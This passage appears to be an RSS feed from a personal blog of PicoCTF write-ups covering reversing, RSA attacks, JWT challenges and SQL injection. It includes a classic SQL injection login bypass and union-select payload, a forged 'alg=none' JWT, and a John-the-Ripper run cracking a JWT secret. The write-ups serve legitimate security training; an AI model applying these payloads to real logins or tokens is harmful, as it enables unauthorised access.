int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+4h] [rbp-4Ch] int j; // [rsp+8h] [rbp-48h] FILE *stream; // [rsp+10h] [rbp-40h] FILE *v8; // [rsp+18h] [rbp-38h] char ptr[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v10; // [rsp+48h] [rbp-8h] v10 = __readfsqword(40u); stream = fopen("flag.txt", "r"); v8 = fopen("mystery.png", "a"); if ( !stream ) puts("No flag found, please make sure this is run on the server"); if ( !v8 ) puts("mystery.png is missing, please run this on the server"); if ( (int)fread(ptr, 26uLL, 1uLL, stream) &lt;= 0 ) exit(0); puts("at insert"); fputc(ptr[0], v8); fputc(ptr[1], v8); fputc(ptr[2], v8); fputc(ptr[3], v8); fputc(ptr[4], v8); fputc(ptr[5], v8); for ( i = 6; i &lt;= 14; ++i ) fputc((char)(ptr[i] + 5), v8); fputc((char)(ptr[15] - 3), v8); for ( j = 16; j &lt;= 25; ++j ) fputc(ptr[j], v8); fclose(v8); fclose(stream); return __readfsqword(40u) ^ v10; } :::</description></item><item><title>PicoCTF - It is my Birthday</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---it-is-my-birthday/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---it-is-my-birthday/index.html</guid><description>PicoCTF - It is my Birthday tags: PicoCTF CTF Web Challenge: It is my Birthday
Background corkami/collisions
Exploit - MD5 Collision Try to find different pdf file that has same MD5 hash Such as the example provided by corkami - poeMD5_A and poeMD5_B Note that, you must notice the file size you uploaded can not too large.
Source code - After Exploit :::spoiler after exploit you can get the source code &amp; flag</description></item><item><title>PicoCTF - It's Not My Fault 1</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/index.html</guid><description>PicoCTF - It’s Not My Fault 1 tags: PicoCTF CTF Crypto Background Source code :::spoiler Source code
#!/usr/bin/python3 -u import random import string import hashlib import time from Crypto.Util.number import inverse, getPrime, bytes_to_long, GCD from sympy.ntheory.modular import solve_congruence FLAG = open('flag.txt', 'r').read() def CRT(a, m, b, n): val, mod = solve_congruence((a, m), (b, n)) return val def gen_key(): while True: p = getPrime(512) q = getPrime(512) if GCD(p-1, q-1) == 2: return p, q def get_clue(p, q, BITS): while True: d_p = random.randint(1, 1 &lt;&lt; BITS) d_q = random.randint(1, q - 1) if d_p % 2 == d_q % 2: d = CRT(d_p, p - 1, d_q, q - 1) e = inverse(d, (p - 1) * (q - 1)) print("Clue : ", e) return def get_flag(p, q): start = time.time() ans = int(input()) if (time.time() - start) > (15 * 60): print("Too long!") exit() else: if ans == p + q: print(FLAG) else: print("oops...") #PoW vals1 = "".join([random.choice(string.digits) for _ in range(5)]) vals2 = "".join([random.choice(string.hexdigits.lower()) for _ in range(6)]) user_input = input("Enter a string that starts with \"{}\" (no quotes) which creates an md5 hash that ends in these six hex digits: {}\n".format(vals1, vals2)) user_hash = hashlib.md5(user_input.encode()).hexdigest() if user_input[:5] == vals1 and user_hash[-6:] == vals2: p, q = gen_key() n = p * q print("Public Modulus : ", n) get_clue(p, q, 20) get_flag(p, q) :::</description></item><item><title>PicoCTF - JAUTH</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jauth/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jauth/index.html</guid><description>PicoCTF - JAUTH Background NTUCNS - HW3 - JWT Authentication
Exploit - JWR + None 其實這一題有一點奇怪，應該說之前在解CNS作業的驗證時，TA說目前應該是不行以Alg=None的形式進行驗證的設計，我以為是後端的框架都不支援了，但應該說是不建議這樣的做法，所以這一題比想像中簡單，我還以為要把公鑰找出來，再進行sign
用類似jwt.io的網站(online tool)，但支援alg=none的編碼 Payload: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MTAzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjg3NzY0MjM1fQ Flag: picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}
Reference picoCTF : JAUTH (Challenge 8)</description></item><item><title>PicoCTF - Java Code Analysis!?!</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-code-analysis_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-code-analysis_/index.html</guid><description>PicoCTF - Java Code Analysis!?! Background JWT
Source code Too Much to list
Hint Maybe try to find the JWT Signing Key (“secret key”) in the source code? Maybe it’s hardcoded somewhere? Or maybe try to crack it? The ‘role’ and ‘userId’ fields in the JWT can be of interest to you! The ‘controllers’, ‘services’ and ‘security’ java packages in the given source code might need your attention. We’ve provided a README.md file that contains some documentation. Upgrade your ‘role’ with the new (cracked) JWT. And re-login for the new role to get reflected in browser’s localStorage. Recon 這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關</description></item><item><title>PicoCTF - Java Script Kiddie</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-script-kiddie/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-script-kiddie/index.html</guid><description>PicoCTF - Java Script Kiddie Background JavaScript Array slice()
const fruits = ["Banana", "Orange", "Lemon", "Apple", "Mango"]; const citrus = fruits.slice(1, 3); # output: Orange,Lemon JavaScript Uint8Array.from() Method
let array = Uint8Array.from('45465768654323456'); console.log(array); # output: Uint8Array(17) [ 4, 5, 4, 6, 5, 7, 6, 8, 6, 5, 4, 3, 2, 3, 4, 5, 6 ] JavaScript String.fromCharCode()
let text = String.fromCharCode(65); console.log(text) # output: A Source code :::spoiler Source Code
&lt;html> &lt;head> &lt;script src="jquery-3.3.1.min.js">&lt;/script> &lt;script> var bytes = []; $.get("bytes", function(resp) { bytes = Array.from(resp.split(" "), x => Number(x)); }); function assemble_png(u_in){ var LEN = 16; var key = "0000000000000000"; var shifter; if(u_in.length == LEN){ key = u_in; } var result = []; for(var i = 0; i &lt; LEN; i++){ shifter = key.charCodeAt(i) - 48; for(var j = 0; j &lt; (bytes.length / LEN); j ++){ result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i] } } while(result[result.length-1] == 0){ result = result.slice(0,result.length-1); } document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result))); return false; } &lt;/script> &lt;/head> &lt;body> &lt;center> &lt;form action="#" onsubmit="assemble_png(document.getElementById('user_in').value)"> &lt;input type="text" id="user_in"> &lt;input type="submit" value="Submit"> &lt;/form> &lt;img id="Area" src=""/> &lt;/center> &lt;/body> &lt;/html> :::</description></item><item><title>PicoCTF - JaWT Scratchpad</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jawt-scratchpad/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jawt-scratchpad/index.html</guid><description>PicoCTF - JaWT Scratchpad Background NTUCNS - HW3 - JWT Authentication
Recon 這一題蠻有趣的，有結合其他東西當作解題的基礎，先看JWT的token，decode過後的結果表示： 也就是說，token只會隨著payload而變動，所以也沒有辦法用解public key的方式重新簽署文件，另外用alg=none也會出現Authentication failed，不過作者有在網頁中有給出提示，用John，看起來就是用john-the-ripper解出token password
Exploit - Brute Force Brute Force Password
$ cat jwt.txt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGhoIn0.j1yd-PJbjNraLhhBAxZBD2C1EVIyHqlnvKh_l-iVKG8% $ ./john.exe ../jwt.txt --wordlist=../rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ilovepico (?) 1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71 Use the "--show" option to display all of the cracked passwords reliably Session completed Token Password: ilovepico</description></item><item><title>PicoCTF - john_pollard</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/index.html</guid><description>PicoCTF - john_pollard tags: PicoCTF CTF Crypto Background openssl - rsa
Source code -----BEGIN CERTIFICATE----- MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1 BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz q16/S1WLvzg4PsElmv1f -----END CERTIFICATE----- Recon Hint 1: The flag is in the format picoCTF{p,q} Hint 2: Try swapping p and q if it does not work 這一題就只是把certificate解出來，發現n超小，所以就直接 Exploit - openssl $ openssl openssl x509 -in cert -pubkey -noout > public.pem -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- $ openssl rsa -pubin -in public.pem -text RSA Public-Key: (53 bit) Modulus: 4966306421059967 (0x11a4d45212b17f) Exponent: 65537 (0x10001) writing RSA key -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- Use online tool to factor p = 67867967 q = 73176001</description></item><item><title>PicoCTF - Kit Engine</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---kit-engine/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---kit-engine/index.html</guid><description>PicoCTF - Kit Engine Background Google V8 Engine
V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。
Using d8
d8 is V8’s own developer shell.
d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the –help argument for more information about usage and flags.</description></item><item><title>PicoCTF - Let's get dynamic</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/index.html</guid><description>PicoCTF - Let’s get dynamic Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+1Ch] [rbp-114h] char s2[64]; // [rsp+20h] [rbp-110h] BYREF char s[64]; // [rsp+60h] [rbp-D0h] BYREF char v7[8]; // [rsp+A0h] [rbp-90h] BYREF __int64 v8; // [rsp+A8h] [rbp-88h] __int64 v9; // [rsp+B0h] [rbp-80h] __int64 v10; // [rsp+B8h] [rbp-78h] __int64 v11; // [rsp+C0h] [rbp-70h] __int64 v12; // [rsp+C8h] [rbp-68h] __int16 v13; // [rsp+D0h] [rbp-60h] __int64 v14[6]; // [rsp+E0h] [rbp-50h] __int16 v15; // [rsp+110h] [rbp-20h] unsigned __int64 v16; // [rsp+118h] [rbp-18h] v16 = __readfsqword(0x28u); *v7 = 0xFD872AC7CA737102LL; v8 = 0x4915F12BF9F82DCBLL; v9 = 0xA7EF0D4C54003C10LL; v10 = 0x9399CCF74D02A843LL; v11 = 0x2AC6F818989688D7LL; v12 = 0x9F51EBCA33584C85LL; v13 = 231; v14[0] = 0x92D46893B5010A61LL; v14[1] = 0xA6BDE59D58F4EB4LL; v14[2] = 0xFC993A3238355027LL; v14[3] = 0xEDA7B28D7054D179LL; v14[4] = 0x419FBB499BD4CFBBLL; v14[5] = 0x935AE3903F554688LL; v15 = 185; fgets(s, 49, _bss_start); for ( i = 0; i &lt; strlen(v7); ++i ) s2[i] = *(v14 + i) ^ v7[i] ^ i ^ 0x13; if ( !memcmp(s, s2, 49uLL) ) { puts("No, that's not right."); return 1; } else { puts("Correct! You entered the flag."); return 0; } } :::</description></item><item><title>PicoCTF - like1000</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---like1000/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---like1000/index.html</guid><description>PicoCTF - like1000 tags: PicoCTF CTF Misc Challenge: like1000
Background How to extract nested tar.gz files easily? Shell Script - While
Exploit - Untar 1000 times For untar folders #! /bin/bash PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH file_name=1000 for next in ${file_name}.tar while [ $file_name > 1 ] do echo "Untaring - $file_name" tar -xvf ${file_name}.tar #-C ./ file_name=$(($file_name-1)) mkdir ./$file_name mv ${file_name}.tar ./$file_name cd ./${file_name} done For getting flag #! /bin/bash PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH file_name=999 while [ "$file_name" > "0" ] do cd ./${file_name} file_name=$(($file_name-1)) if [ "$file_name" == "0" ] then ls -al cat filler.txt mv flag.png ~/CTF/PicoCTF/Misc/like1000 fi done exit 0 Reference Shell Script 變數相加 How to solve gzip: stdin: not in gzip format error 解压缩报错tar: Error is not recoverable: exiting now In a bash script, using the conditional “or” in an “if” statement</description></item><item><title>PicoCTF - m00nwalk</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/index.html</guid><description>PicoCTF - m00nwalk tags: PicoCTF CTF Misc Challenge: m00nwalk
Description &amp; Hint Decode this message from the moon. Hint:
How did pictures from the moon landing get sent back to Earth? What is the CMU mascot?, that might help select a RX option Background 慢掃描電視 - slow-scan television(sstv)
Source code Exploit - qsstv + First, I thought it might be a mp3stego problem but found nothing. So, I tried to find the write up about this question. Use QSSTV $ sudo apt-get install pavucontrol $ sudo apt-get install qsstv $ pactl load-module module-null-sink sink_name=virtual-cable 22 The Setting pavucontrol</description></item><item><title>PicoCTF - m00nwalk2</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/index.html</guid><description>PicoCTF - m00nwalk2 tags: PicoCTF CTF Misc Challenge: m00nwalk2
Description &amp; Hint Revisit the last transmission. We think this transmission contains a hidden message. There are also some clues clue 1, clue 2, clue 3.
Hint:
Use the clues to extract the another flag from the .wav file Background m00nwalk
Exploit - QSSTV Follow the write up of m00nwalk then you’ll get 3 images from 3 clues respectively.</description></item><item><title>PicoCTF - MacroHard WeakEdge</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/index.html</guid><description>PicoCTF - MacroHard WeakEdge tags: PicoCTF CTF Misc Challenge: MacroHard WeakEdge
Background What is a PPTM file? It’s a zip format file
A PPTM file is a macro-enabled presentation created by Microsoft PowerPoint, an application used to create presentations and slide shows. It contains a collection of slides, which typically includes text, layout, images, and embedded macros. PPTM files are commonly used to store business, marketing, and academic presentations.</description></item><item><title>PicoCTF - Matryoshka doll</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/index.html</guid><description>PicoCTF - Matryoshka doll tags: PicoCTF CTF Misc Challenge: Exploit - rar in rar Hint The hint said:
Wait, you can hide files inside files? But how do you find them?
So…I tried stegsolve, HxD, exiftool, string dolls.jpg | grep "{", $ zsteg dolls.jpg … All these are in vain
通靈: Changed the extension to .rar And it can be uncompressed</description></item><item><title>PicoCTF - Mind your Ps and Qs</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/index.html</guid><description>PicoCTF - Mind your Ps and Qs tags: PicoCTF CTF Crypto Challenge: Mind your Ps and Qs
Background RSA (觀念篇) Source code Decrypt my super sick RSA: c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684 n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637 e: 65537 Exploit - Find P &amp; Q By Online Tool Find P &amp; Q Use online tool to do prime factorize on n p $\to$ 1461849912200000206276283741896701133693 q $\to$ 431899300006243611356963607089521499045809
Write exploit
e = 65537 M = 631371953793368771804570727896887140714061729769155038068711341335911329840163136 k = 1 # p = 1461849912200000206276283741896701133693 # q = 431899300006243611356963607089521499045809 def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x-(b//a)*y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % m while(True): if (1 + k * M) % e == 0: print('k = ', k, ' and d = ', (1 + k * M) / e) break else: k += 1 d = modinv(e, M) c = 421345306292040663864066688931456845278496274597031632020995583473619804626233684 n = 631371953793368771804570727896887140714495090919073481680274581226742748040342637 plain = pow(c, d, n) print(plain) print(hex(plain)) print(bytearray.fromhex(hex(plain)[2:])) Reference picoCTF 2021 Mind your Ps and Qs</description></item><item><title>PicoCTF - Mini RSA</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/index.html</guid><description>PicoCTF - Mini RSA tags: PicoCTF CTF Crypto Challenge: Mini RSA
Source code N: 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287 e: 3 ciphertext (c): 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106 Exploit - Small e attack import gmpy2 from Crypto.Util.number import long_to_bytes N = 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287 e = 3 c = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106 k = 1 while True: if gmpy2.iroot(c + N * k, 3)[1]==1: res=gmpy2.iroot(c + N * k, 3)[0] print(k, res) print(long_to_bytes(res)) break k += 1 Reference CTF_RSA解密学习指南(三) - e=3 小明文攻击</description></item><item><title>PicoCTF - More SQLi</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---more-sqli/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---more-sqli/index.html</guid><description>PicoCTF - More SQLi Background Feifei Lab Hint SQLiLite Recon 先隨便輸入發現他很貼心有給完整的payload，發現他是先檢查password，在沒有任何防護的情況下，直接用最經典的payload就可了 Account: Any Password: ' or '1'='1' -- # Exploit - SQLi(Union Selection) 現在的目標是flag應該是藏在別的table，所以先找甚麼table
找table 透過Kaibro的cheat sheet，SQLite的爆破payload是SELECT name FROM sqlite_master WHERE type='table'，而目前我們可以用union based的方式搜尋，先觀察搜尋Algiers的搜尋column有三個，第一個column是chr，第二個column是chr，第三個是int，所以在用union select的時候要遵守查詢數量一樣、每個欄位的型態一樣 Payload: Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table'; -- :::spoiler Screenshot :::</description></item><item><title>PicoCTF - Most Cookies</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/index.html</guid><description>PicoCTF - Most Cookies tags: PicoCTF CTF Web Background Python Flask session 學習心得
在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。
Source code :::spoiler Source Code
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session import random app = Flask(__name__) flag_value = open("./flag").read().rstrip() title = "Most Cookies" cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"] app.secret_key = random.choice(cookie_names) @app.route("/") def main(): if session.get("very_auth"): check = session["very_auth"] if check == "blank": return render_template("index.html", title=title) else: return make_response(redirect("/display")) else: resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp @app.route("/search", methods=["GET", "POST"]) def search(): if "name" in request.form and request.form["name"] in cookie_names: resp = make_response(redirect("/display")) session["very_auth"] = request.form["name"] return resp else: message = "That doesn't appear to be a valid cookie." category = "danger" flash(message, category) resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp @app.route("/reset") def reset(): resp = make_response(redirect("/")) session.pop("very_auth", None) return resp @app.route("/display", methods=["GET"]) def flag(): if session.get("very_auth"): check = session["very_auth"] if check == "admin": resp = make_response(render_template("flag.html", value=flag_value, title=title)) return resp flash("That is a cookie! Not very special though...", "success") return render_template("not-flag.html", title=title, cookie_name=session["very_auth"]) else: resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp if __name__ == "__main__": app.run() :::</description></item><item><title>PicoCTF - mus1c</title><link>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---mus1c/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---mus1c/index.html</guid><description>PicoCTF - mus1c tags: PicoCTF CTF General Skill Source code :::spoiler Lyrics
Pico's a CTFFFFFFF my mind is waitin It's waitin Put my mind of Pico into This my flag is not found put This into my flag put my flag into Pico shout Pico shout Pico shout Pico My song's something put Pico into This Knock This down, down, down put This into CTF shout CTF my lyric is nothing Put This without my song into my lyric Knock my lyric down, down, down shout my lyric Put my lyric into This Put my song with This into my lyric Knock my lyric down shout my lyric Build my lyric up, up ,up shout my lyric shout Pico shout It Pico CTF is fun security is important Fun is fun Put security with fun into Pico CTF Build Fun up shout fun times Pico CTF put fun times Pico CTF into my song build it up shout it shout it build it up, up shout it shout Pico :::</description></item><item><title>PicoCTF - New Caesar</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---new-caesar/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---new-caesar/index.html</guid><description>PicoCTF - New Caesar tags: PicoCTF CTF Crypto Challenge: New Caesar
Source code ::: spoiler source code
import string LOWERCASE_OFFSET = ord("a") ALPHABET = string.ascii_lowercase[:16] def b16_encode(plain): enc = "" for c in plain: binary = "{0:08b}".format(ord(c)) enc += ALPHABET[int(binary[:4], 2)] enc += ALPHABET[int(binary[4:], 2)] return enc def shift(c, k): t1 = ord(c) - LOWERCASE_OFFSET t2 = ord(k) - LOWERCASE_OFFSET return ALPHABET[(t1 + t2) % len(ALPHABET)] flag = "redacted" key = "redacted" assert all([k in ALPHABET for k in key]) assert len(key) == 1 b16 = b16_encode(flag) enc = "" for i, c in enumerate(b16): enc += shift(c, key[i % len(key)]) print(enc) :::</description></item><item><title>PicoCTF - No Padding, No Problem</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/index.html</guid><description>PicoCTF - No Padding, No Problem tags: PicoCTF CTF Crypto Description Oracles can be your best friend, they will decrypt anything, except the flag’s ciphertext. How will you break it? Connect with nc mercury.picoctf.net 10333.
Hint What can you do with a different pair of ciphertext and plaintext? What if it is not so different after all…
Recon We can try to decrypt ciphertext directly.
